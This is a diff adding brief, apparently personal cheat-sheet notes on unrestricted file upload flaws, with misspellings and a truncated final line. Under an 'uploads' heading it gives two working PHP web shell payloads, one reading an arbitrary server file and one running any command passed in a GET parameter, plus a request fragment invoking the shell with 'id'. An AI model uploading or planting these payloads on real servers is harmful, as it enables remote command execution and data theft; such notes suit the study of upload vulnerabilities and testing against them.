@@ -1,0 +1,12 @@
+# file upload
+when files are uploaded
+and not checked
+
+its possible to upload fe a webshell
+and then acces the webshell
+
+## uploads
+<?php echo file_get_contents('/path/to/target/file'); ?>
+
+<?php echo system($_GET['command']); ?>
+xample/exploit.php?command=id HTTP/1.1
